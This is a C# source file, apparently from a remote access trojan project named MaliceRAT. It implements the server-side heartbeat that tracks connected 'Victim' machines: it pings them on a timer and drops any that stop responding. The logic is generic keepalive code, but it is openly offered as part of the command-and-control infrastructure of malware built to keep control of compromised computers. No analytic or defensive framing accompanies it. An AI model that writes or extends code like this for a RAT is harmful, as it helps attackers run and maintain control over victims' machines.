using System;
using System.Net.Sockets;
using System.Timers;
using System.Web.Script.Serialization;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace MaliceRAT.RatServer.Features
{
    public class Heartbeat
    {
        #region Variables
        private double interval;
        private Server server;
        private Dictionary<Victim, Timer> heartbeatTimers = new Dictionary<Victim, Timer>();
        private Dictionary<Victim, bool> heartbeatReceived = new Dictionary<Victim, bool>();

        public Heartbeat(double interval, Server server)
        {
            this.interval = interval;
            this.server = server;
            server.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        public void StartHeartbeat(NetworkStream stream, Victim victim)
        {
            Timer timer = new Timer(interval);
            timer.Elapsed += async (sender, e) =>
            {
                if (!heartbeatReceived[victim])
                {
                    timer.Stop();
                    stream.Close();
                    server.OnClientDisconnected(victim);
                    return;
                }
                heartbeatReceived[victim] = false;
                await SendHeartbeat(stream, victim);
            };
            timer.Start();
            heartbeatTimers[victim] = timer;
            heartbeatReceived[victim] = true;
        }

        public void StopHeartbeat(Victim victim)
        {
            if (heartbeatTimers.ContainsKey(victim))
            {
                heartbeatTimers[victim].Stop();
                heartbeatTimers.Remove(victim);
                heartbeatReceived.Remove(victim);
            }
        }

        private void HandleMessage(Victim victim, dynamic message)
        {
            if (message["type"] == "heartbeat" && heartbeatReceived.ContainsKey(victim))
            {
                heartbeatReceived[victim] = true;
            }
        }

        private async Task SendHeartbeat(NetworkStream stream, Victim victim)
        {
            if (stream != null && stream.CanWrite)
            {
                await victim.SendAsync(new { type = "heartbeat", text = "ping" });
            }
        }
        #endregion
    }
}